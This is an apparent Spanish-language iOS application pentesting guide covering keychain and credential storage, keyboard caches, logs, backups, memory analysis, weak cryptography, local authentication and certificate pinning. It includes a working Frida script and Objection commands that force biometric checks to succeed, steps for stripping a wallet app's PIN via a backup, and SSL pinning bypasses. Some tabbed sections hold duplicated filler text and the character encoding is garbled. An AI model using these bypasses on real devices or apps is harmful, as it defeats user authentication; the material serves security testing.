Objective-C es un lenguaje de programaci贸n utilizado para el desarrollo de aplicaciones en iOS. Es importante comprender los conceptos b谩sicos de Objective-C para realizar pruebas de penetraci贸n en aplicaciones iOS de manera efectiva.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Este c贸digo establece la imagen de fondo en `overlayImage.png` cada vez que la aplicaci贸n pasa a segundo plano. Esto evita fugas de datos sensibles porque `overlayImage.png` siempre sobrescribir谩 la vista actual.

### Llavero

Para acceder y gestionar el llavero de iOS, herramientas como [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) est谩n disponibles, adecuadas para dispositivos con jailbreak. Adem谩s, [**Objection**](https://github.com/sensepost/objection) proporciona el comando `ios keychain dump` con prop贸sitos similares.

#### **Almacenamiento de Credenciales**

La clase **NSURLCredential** es ideal para guardar informaci贸n sensible directamente en el llavero, evitando la necesidad de NSUserDefaults u otros envoltorios. Para almacenar credenciales despu茅s del inicio de sesi贸n, se utiliza el siguiente c贸digo Swift:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Para extraer estas credenciales almacenadas, se utiliza el comando `ios nsurlcredentialstorage dump` de Objection.

## **Teclados Personalizados y Cach茅 de Teclado**

A partir de iOS 8.0, los usuarios pueden instalar extensiones de teclado personalizadas, que se pueden gestionar en **Configuraci贸n > General > Teclado > Teclados**. Si bien estos teclados ofrecen funcionalidades extendidas, representan un riesgo de registro de pulsaciones de teclas y de env铆o de datos a servidores externos, aunque los usuarios son notificados sobre los teclados que requieren acceso a la red. Las aplicaciones pueden y deben restringir el uso de teclados personalizados para la introducci贸n de informaci贸n sensible.

**Recomendaciones de Seguridad:**
- Se recomienda desactivar los teclados de terceros para una seguridad mejorada.
- Tener en cuenta las funciones de autocorrecci贸n y sugerencias autom谩ticas del teclado iOS predeterminado, que podr铆an almacenar informaci贸n sensible en archivos de cach茅 ubicados en `Library/Keyboard/{locale}-dynamic-text.dat` o `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Estos archivos de cach茅 deben ser revisados regularmente en busca de datos sensibles. Se recomienda restablecer el diccionario del teclado a trav茅s de **Configuraci贸n > General > Restablecer > Restablecer diccionario del teclado** para limpiar los datos en cach茅.
- La interceptaci贸n del tr谩fico de red puede revelar si un teclado personalizado est谩 transmitiendo pulsaciones de teclas de forma remota.

### **Prevenci贸n del Cach茅 de Campos de Texto**

El [protocolo UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) ofrece propiedades para gestionar la autocorrecci贸n y la entrada de texto segura, esenciales para prevenir el almacenamiento en cach茅 de informaci贸n sensible. Por ejemplo, deshabilitar la autocorrecci贸n y habilitar la entrada de texto segura se puede lograr con:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Adem谩s, los desarrolladores deben asegurarse de que los campos de texto, especialmente aquellos para ingresar informaci贸n sensible como contrase帽as y PIN, deshabiliten el almacenamiento en cach茅 configurando `autocorrectionType` en `UITextAutocorrectionTypeNo` y `secureTextEntry` en `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Registros**

Depurar c贸digo a menudo implica el uso de **registros**. Existe un riesgo ya que los **registros pueden contener informaci贸n sensible**. Anteriormente, en iOS 6 y versiones anteriores, los registros eran accesibles para todas las aplicaciones, lo que representaba un riesgo de fuga de datos sensibles. **Ahora, las aplicaciones est谩n restringidas a acceder solo a sus propios registros**.

A pesar de estas restricciones, un **atacante con acceso f铆sico** a un dispositivo desbloqueado a煤n puede explotar esto conectando el dispositivo a una computadora y **leyendo los registros**. Es importante tener en cuenta que los registros permanecen en el disco incluso despu茅s de desinstalar la aplicaci贸n.

Para mitigar riesgos, se recomienda **interactuar minuciosamente con la aplicaci贸n**, explorando todas sus funcionalidades y entradas para asegurarse de que no se est茅 registrando informaci贸n sensible involuntariamente.

Al revisar el c贸digo fuente de la aplicaci贸n en busca de posibles fugas, busque tanto **declaraciones de registro predefinidas** como **personalizadas** utilizando palabras clave como `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` para funciones integradas, y cualquier menci贸n de `Logging` o `Logfile` para implementaciones personalizadas.

### **Monitoreo de Registros del Sistema**

Las aplicaciones registran varias piezas de informaci贸n que pueden ser sensibles. Para monitorear estos registros, se utilizan herramientas y comandos como:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
Son 煤tiles. Adem谩s, **Xcode** proporciona una forma de recopilar registros de consola:

1. Abre Xcode.
2. Conecta el dispositivo iOS.
3. Navega a **Ventana** -> **Dispositivos y Simuladores**.
4. Selecciona tu dispositivo.
5. Provoca el problema que est谩s investigando.
6. Utiliza el bot贸n **Abrir Consola** para ver los registros en una nueva ventana.

Para un registro m谩s avanzado, conectarse a la shell del dispositivo y usar **socat** puede proporcionar monitoreo de registros en tiempo real:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
### Copias de seguridad

Las **funciones de autorespaldo** est谩n integradas en iOS, facilitando la creaci贸n de copias de datos del dispositivo a trav茅s de iTunes (hasta macOS Catalina), Finder (desde macOS Catalina en adelante) o iCloud. Estas copias de seguridad abarcan casi todos los datos del dispositivo, excluyendo elementos altamente sensibles como detalles de Apple Pay y configuraciones de Touch ID.

### Riesgos de seguridad

La inclusi贸n de **aplicaciones instaladas y sus datos** en las copias de seguridad plantea el problema de posibles **filtraciones de datos** y el riesgo de que las **modificaciones de la copia de seguridad puedan alterar la funcionalidad de la aplicaci贸n**. Se recomienda **no almacenar informaci贸n sensible en texto plano** dentro del directorio de ninguna aplicaci贸n o sus subdirectorios para mitigar estos riesgos.

### Excluir archivos de las copias de seguridad

Los archivos en `Documents/` y `Library/Application Support/` se respaldan de forma predeterminada. Los desarrolladores pueden excluir archivos o directorios espec铆ficos de las copias de seguridad utilizando `NSURL setResourceValue:forKey:error:` con la clave `NSURLIsExcludedFromBackupKey`. Esta pr谩ctica es crucial para proteger los datos sensibles de ser incluidos en las copias de seguridad.

### Pruebas de vulnerabilidades

Para evaluar la seguridad de la copia de seguridad de una aplicaci贸n, comience por **crear una copia de seguridad** utilizando Finder, luego local铆cela siguiendo la gu铆a de la [documentaci贸n oficial de Apple](https://support.apple.com/en-us/HT204215). Analice la copia de seguridad en busca de datos sensibles o configuraciones que podr铆an ser modificadas para afectar el comportamiento de la aplicaci贸n.

La informaci贸n sensible se puede buscar utilizando herramientas de l铆nea de comandos o aplicaciones como [iMazing](https://imazing.com). Para copias de seguridad encriptadas, la presencia de encriptaci贸n se puede confirmar verificando la clave "IsEncrypted" en el archivo "Manifest.plist" en la ra铆z de la copia de seguridad.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Para lidiar con copias de seguridad encriptadas, los scripts de Python disponibles en el [repositorio de GitHub de DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), como **backup_tool.py** y **backup_passwd.py**, pueden ser 煤tiles, aunque potencialmente requieran ajustes para ser compatibles con las 煤ltimas versiones de iTunes/Finder. La herramienta [**iOSbackup**](https://pypi.org/project/iOSbackup/) es otra opci贸n para acceder a archivos dentro de copias de seguridad protegidas con contrase帽a.

### Modificaci贸n del Comportamiento de la Aplicaci贸n

Un ejemplo de alterar el comportamiento de una aplicaci贸n a trav茅s de modificaciones en la copia de seguridad se muestra en la aplicaci贸n de billetera de bitcoins Bither (https://github.com/bither/bither-ios), donde el PIN de bloqueo de la interfaz de usuario se almacena dentro de `net.bither.plist` bajo la clave **pin_code**. Eliminar esta clave del plist y restaurar la copia de seguridad elimina el requisito del PIN, proporcionando acceso sin restricciones.

## Resumen sobre Pruebas de Memoria para Datos Sensibles

Al tratar con informaci贸n sensible almacenada en la memoria de una aplicaci贸n, es crucial limitar el tiempo de exposici贸n de estos datos. Hay dos enfoques principales para investigar el contenido de la memoria: **crear un volcado de memoria** y **analizar la memoria en tiempo real**. Ambos m茅todos tienen sus desaf铆os, incluida la posibilidad de perder datos cr铆ticos durante el proceso de volcado o an谩lisis.

## **Recuperaci贸n y An谩lisis de un Volcado de Memoria**

Tanto en dispositivos con jailbreak como sin jailbreak, herramientas como [objection](https://github.com/sensepost/objection) y [Fridump](https://github.com/Nightbringer21/fridump) permiten el volcado de la memoria del proceso de una aplicaci贸n. Una vez volcada, analizar estos datos requiere diversas herramientas, dependiendo de la naturaleza de la informaci贸n que est谩s buscando.

Para extraer cadenas de un volcado de memoria, se pueden utilizar comandos como `strings` o `rabin2 -zz`:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Para un an谩lisis m谩s detallado, incluida la b煤squeda de tipos de datos o patrones espec铆ficos, **radare2** ofrece amplias capacidades de b煤squeda:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **An谩lisis de Memoria en Tiempo de Ejecuci贸n**

**r2frida** proporciona una alternativa poderosa para inspeccionar la memoria de una aplicaci贸n en tiempo real, sin necesidad de un volcado de memoria. Esta herramienta permite la ejecuci贸n de comandos de b煤squeda directamente en la memoria de la aplicaci贸n en ejecuci贸n:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Criptograf铆a Rota

### Procesos de Gesti贸n de Claves Deficientes

Algunos desarrolladores guardan datos sensibles en el almacenamiento local y los cifran con una clave codificada/predecible en el c贸digo. Esto no deber铆a hacerse, ya que un proceso de reversi贸n podr铆a permitir a los atacantes extraer la informaci贸n confidencial.

### Uso de Algoritmos Inseguros y/o Obsoletos

Los desarrolladores no deber铆an utilizar algoritmos **obsoletos** para realizar **verificaciones** de autorizaci贸n, **almacenar** o **enviar** datos. Algunos de estos algoritmos son: RC4, MD4, MD5, SHA1... Si se utilizan **hashes** para almacenar contrase帽as, por ejemplo, se deben utilizar hashes resistentes a ataques de fuerza bruta con sal.

### Verificaci贸n

Las principales verificaciones a realizar son encontrar contrase帽as/secretos **codificados** en el c贸digo, o si estos son **predecibles**, y si el c贸digo est谩 utilizando alg煤n tipo de algoritmos de **criptograf铆a** d茅biles.

Es interesante saber que puedes **monitorizar** algunas **bibliotecas de criptograf铆a** autom谩ticamente usando **objection** con:
```swift
ios monitor crypt
```
Para **m谩s informaci贸n** sobre las API y bibliotecas criptogr谩ficas de iOS, accede a [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Autenticaci贸n Local

La **autenticaci贸n local** juega un papel crucial, especialmente cuando se trata de salvaguardar el acceso en un punto final remoto a trav茅s de m茅todos criptogr谩ficos. La esencia aqu铆 es que sin una implementaci贸n adecuada, los mecanismos de autenticaci贸n local pueden ser eludidos.

El **[framework de Autenticaci贸n Local](https://developer.apple.com/documentation/localauthentication)** de Apple y el **[llavero](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)** proporcionan APIs robustas para que los desarrolladores faciliten di谩logos de autenticaci贸n de usuarios y manejen de forma segura datos secretos, respectivamente. El Secure Enclave asegura la identificaci贸n de huellas dactilares para Touch ID, mientras que Face ID se basa en el reconocimiento facial sin comprometer datos biom茅tricos.

Para integrar Touch ID/Face ID, los desarrolladores tienen dos opciones de API:
- **`LocalAuthentication.framework`** para autenticaci贸n de usuario de alto nivel sin acceso a datos biom茅tricos.
- **`Security.framework`** para acceso a servicios de llavero de nivel inferior, asegurando datos secretos con autenticaci贸n biom茅trica. Varios [envoltorios de c贸digo abierto](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) hacen que el acceso al llavero sea m谩s sencillo.

{% hint style="danger" %}
Sin embargo, tanto `LocalAuthentication.framework` como `Security.framework` presentan vulnerabilidades, ya que principalmente devuelven valores booleanos sin transmitir datos para procesos de autenticaci贸n, haci茅ndolos susceptibles a eludir (consultar [Don't touch me that way, de David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Implementaci贸n de Autenticaci贸n Local

Para solicitar a los usuarios autenticaci贸n, los desarrolladores deben utilizar el m茅todo **`evaluatePolicy`** dentro de la clase **`LAContext`**, eligiendo entre:
- **`deviceOwnerAuthentication`**: Solicita Touch ID o c贸digo de acceso del dispositivo, fallando si ninguno est谩 habilitado.
- **`deviceOwnerAuthenticationWithBiometrics`**: Solicita exclusivamente Touch ID.

Una autenticaci贸n exitosa se indica con un valor booleano devuelto por **`evaluatePolicy`**, resaltando una posible falla de seguridad.

### Autenticaci贸n Local utilizando el Llavero

Implementar la **autenticaci贸n local** en aplicaciones de iOS implica el uso de **APIs de llavero** para almacenar de forma segura datos secretos como tokens de autenticaci贸n. Este proceso asegura que los datos solo puedan ser accedidos por el usuario, utilizando su c贸digo de acceso del dispositivo o autenticaci贸n biom茅trica como Touch ID.

El llavero ofrece la capacidad de establecer elementos con el atributo `SecAccessControl`, que restringe el acceso al elemento hasta que el usuario se autentique con 茅xito a trav茅s de Touch ID o c贸digo de acceso del dispositivo. Esta caracter铆stica es crucial para mejorar la seguridad.

A continuaci贸n se muestran ejemplos de c贸digo en Swift y Objective-C que demuestran c贸mo guardar y recuperar una cadena en/desde el llavero, aprovechando estas caracter铆sticas de seguridad. Los ejemplos muestran espec铆ficamente c贸mo configurar el control de acceso para requerir autenticaci贸n con Touch ID y asegurar que los datos solo sean accesibles en el dispositivo en el que se configuraron, bajo la condici贸n de que se haya configurado un c贸digo de acceso del dispositivo.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}

### Introducci贸n

El pentesting en iOS requiere un enfoque especializado debido a las medidas de seguridad implementadas por Apple en sus dispositivos. En esta secci贸n, se proporcionan t茅cnicas y herramientas para llevar a cabo pruebas de penetraci贸n en aplicaciones iOS escritas en Objective-C.

### Configuraci贸n del entorno

Para realizar pruebas de penetraci贸n en aplicaciones iOS escritas en Objective-C, es necesario configurar un entorno de laboratorio que consta de un dispositivo iOS jailbroken o un simulador de iOS. Adem谩s, se requiere un conjunto de herramientas espec铆ficas para realizar pruebas de seguridad de aplicaciones iOS.

### T茅cnicas de pentesting

Algunas t茅cnicas comunes de pentesting en aplicaciones iOS escritas en Objective-C incluyen la inspecci贸n de la comunicaci贸n de red, la manipulaci贸n de la memoria, la ingenier铆a inversa de la aplicaci贸n y la b煤squeda de vulnerabilidades de seguridad en el c贸digo Objective-C.

### Herramientas de pentesting

Existen varias herramientas de pentesting que son 煤tiles para evaluar la seguridad de aplicaciones iOS escritas en Objective-C, como Frida, Cycript, Hopper, Clutch y SSL Kill Switch.

### Recursos adicionales

Para obtener m谩s informaci贸n sobre t茅cnicas avanzadas de pentesting en aplicaciones iOS escritas en Objective-C, se recomienda consultar libros, blogs y cursos especializados en seguridad de aplicaciones m贸viles.

{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
Ahora podemos solicitar el elemento guardado del llavero. Los servicios del llavero presentar谩n el cuadro de di谩logo de autenticaci贸n al usuario y devolver谩n datos o nil dependiendo de si se proporcion贸 una huella digital adecuada o no.
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}

### Introducci贸n

El pentesting en iOS requiere un enfoque especializado debido a las medidas de seguridad implementadas por Apple en sus dispositivos. En esta secci贸n, se proporcionan t茅cnicas y herramientas para llevar a cabo pruebas de penetraci贸n en aplicaciones iOS escritas en Objective-C.

### Configuraci贸n del entorno

Para realizar pruebas de penetraci贸n en aplicaciones iOS escritas en Objective-C, es necesario configurar un entorno de laboratorio que incluya un dispositivo iOS jailbroken o un emulador iOS con jailbreak. Adem谩s, se recomienda el uso de herramientas como Cycript, class-dump, clutch, entre otras, para analizar y manipular aplicaciones Objective-C.

### T茅cnicas de pentesting

Algunas t茅cnicas comunes de pentesting en aplicaciones iOS escritas en Objective-C incluyen la inspecci贸n de la comunicaci贸n de red, la b煤squeda de vulnerabilidades de seguridad en el c贸digo Objective-C, la manipulaci贸n de la memoria para realizar ataques de inyecci贸n de c贸digo, entre otras.

### Recursos adicionales

Para obtener m谩s informaci贸n sobre t茅cnicas avanzadas de pentesting en aplicaciones iOS escritas en Objective-C, se recomienda consultar libros, blogs y cursos especializados en seguridad m贸vil y hacking de aplicaciones iOS.

{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
### Detecci贸n

El uso de frameworks en una aplicaci贸n tambi茅n puede ser detectado analizando la lista de bibliotecas din谩micas compartidas del binario de la aplicaci贸n. Esto se puede hacer utilizando `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Si se utiliza `LocalAuthentication.framework` en una aplicaci贸n, la salida contendr谩 ambas de las siguientes l铆neas (recuerda que `LocalAuthentication.framework` utiliza `Security.framework` internamente):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Si se utiliza `Security.framework`, solo se mostrar谩 el segundo.

### Bypass del Marco de Autenticaci贸n Local

#### **Objeci贸n**

A trav茅s del **Bypass Biom茅trico de Objection**, ubicado en [esta p谩gina de GitHub](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), est谩 disponible una t茅cnica para superar el mecanismo de **LocalAuthentication**. El n煤cleo de este enfoque implica aprovechar **Frida** para manipular la funci贸n `evaluatePolicy`, asegurando que produzca consistentemente un resultado `True`, independientemente del 茅xito real de la autenticaci贸n. Esto es particularmente 煤til para eludir procesos de autenticaci贸n biom茅trica defectuosos.

Para activar este bypass, se emplea el siguiente comando:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Este comando inicia una secuencia donde Objection registra una tarea que altera efectivamente el resultado de la verificaci贸n de `evaluatePolicy` a `True`.

#### Frida

Un ejemplo de uso de **`evaluatePolicy`** de la aplicaci贸n [DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Para lograr el **bypass** de la Autenticaci贸n Local, se escribe un script de Frida. Este script apunta a la verificaci贸n de **evaluatePolicy**, interceptando su devoluci贸n de llamada para asegurar que devuelva **success=1**. Al alterar el comportamiento de la devoluci贸n de llamada, se logra eludir efectivamente la verificaci贸n de autenticaci贸n.

El siguiente script se inyecta para modificar el resultado del m茅todo **evaluatePolicy**. Cambia el resultado de la devoluci贸n de llamada para indicar siempre 茅xito.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Para inyectar el script de Frida y evitar la autenticaci贸n biom茅trica, se utiliza el siguiente comando:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Exposici贸n de Funcionalidades Sensibles a Trav茅s de IPC

### Manipuladores de URI Personalizados / Deeplinks / Esquemas Personalizados

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Enlaces Universales

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Compartir UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Extensiones de Aplicaciones

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serializaci贸n y Codificaci贸n

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Comunicaci贸n de Red

Es importante verificar que no se est茅 produciendo ninguna comunicaci贸n **sin cifrado** y tambi茅n que la aplicaci贸n est茅 validando correctamente el **certificado TLS** del servidor.\
Para verificar este tipo de problemas, puedes utilizar un proxy como **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Verificaci贸n de Nombre de Host

Un problema com煤n al validar el certificado TLS es verificar que el certificado fue firmado por una **CA de confianza**, pero **no verificar** si **el nombre de host** del certificado es el nombre de host al que se accede.\
Para verificar este problema usando Burp, despu茅s de confiar en la CA de Burp en el iPhone, puedes **crear un nuevo certificado con Burp para un nombre de host diferente** y usarlo. Si la aplicaci贸n sigue funcionando, entonces algo es vulnerable.

### Pinning de Certificados

Si una aplicaci贸n est谩 utilizando correctamente el Pinning SSL, entonces la aplicaci贸n solo funcionar谩 si el certificado es el esperado. Al probar una aplicaci贸n, **esto puede ser un problema ya que Burp servir谩 su propio certificado.**\
Para evitar esta protecci贸n dentro de un dispositivo con jailbreak, puedes instalar la aplicaci贸n [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) o instalar [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Tambi茅n puedes usar `ios sslpinning disable` de **objection**

## Varios

* En **`/System/Library`** puedes encontrar los frameworks instalados en el tel茅fono utilizados por las aplicaciones del sistema
* Las aplicaciones instaladas por el usuario desde la App Store se encuentran dentro de **`/User/Applications`**
* Y **`/User/Library`** contiene datos guardados por las aplicaciones a nivel de usuario
* Puedes acceder a **`/User/Library/Notes/notes.sqlite`** para leer las notas guardadas dentro de la aplicaci贸n.
* Dentro de la carpeta de una aplicaci贸n instalada (**`/User/Applications/<ID DE LA APP>/`**) puedes encontrar algunos archivos interesantes:
  * **`iTunesArtwork`**: El icono utilizado por la aplicaci贸n
  * **`iTunesMetadata.plist`**: Informaci贸n de la aplicaci贸n utilizada en la App Store
  * **`/Library/*`**: Contiene las preferencias y cach茅. En **`/Library/Cache/Snapshots/*`** puedes encontrar la instant谩nea realizada a la aplicaci贸n antes de enviarla al segundo plano.

### Parcheo en Caliente/Actualizaci贸n Forzada

Los desarrolladores pueden **parchear remotamente todas las instalaciones de su aplicaci贸n al instante** sin tener que volver a enviar la aplicaci贸n a la App Store y esperar a que sea aprobada.\
Para este prop贸sito, generalmente se utiliza [**JSPatch**](https://github.com/bang590/JSPatch)**.** Pero tambi茅n existen otras opciones como [Siren](https://github.com/ArtSabintsev/Siren) y [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Este es un mecanismo peligroso que podr铆a ser abusado por SDK de terceros maliciosos, por lo tanto se recomienda verificar qu茅 m茅todo se utiliza para la actualizaci贸n autom谩tica (si la hay) y probarlo.** Podr铆as intentar descargar una versi贸n anterior de la aplicaci贸n con este prop贸sito.

### Terceros

Un desaf铆o significativo con **SDK de terceros** es la **falta de control granular** sobre sus funcionalidades. Los desarrolladores se enfrentan a una elecci贸n: integrar el SDK y aceptar todas sus caracter铆sticas, incluidas posibles vulnerabilidades de seguridad y preocupaciones de privacidad, o renunciar por completo a sus beneficios. A menudo, los desarrolladores no pueden parchear las vulnerabilidades dentro de estos SDK por s铆 mismos. Adem谩s, a medida que los SDK ganan confianza dentro de la comunidad, algunos pueden empezar a contener malware.

Los servicios proporcionados por los SDK de terceros pueden incluir seguimiento del comportamiento del usuario, visualizaci贸n de anuncios o mejoras en la experiencia del usuario. Sin embargo, esto introduce un riesgo ya que los desarrolladores pueden no estar completamente al tanto del c贸digo ejecutado por estas bibliotecas, lo que conlleva posibles riesgos de privacidad y seguridad. Es crucial limitar la informaci贸n compartida con los servicios de terceros a lo necesario y asegurarse de que no se expongan datos sensibles.

La implementaci贸n de servicios de terceros suele venir en dos formas: una biblioteca independiente o un SDK completo. Para proteger la privacidad del usuario, cualquier dato compartido con estos servicios debe estar **anonimizado** para evitar la divulgaci贸n de Informaci贸n de Identificaci贸n Personal (PII).

Para identificar las bibliotecas que utiliza una aplicaci贸n, se puede emplear el comando **`otool`**. Este comando debe ejecutarse contra la aplicaci贸n y cada biblioteca compartida que utiliza para descubrir bibliotecas adicionales.
```bash
otool -L <application_path>
```
## **Referencias y M谩s Recursos**

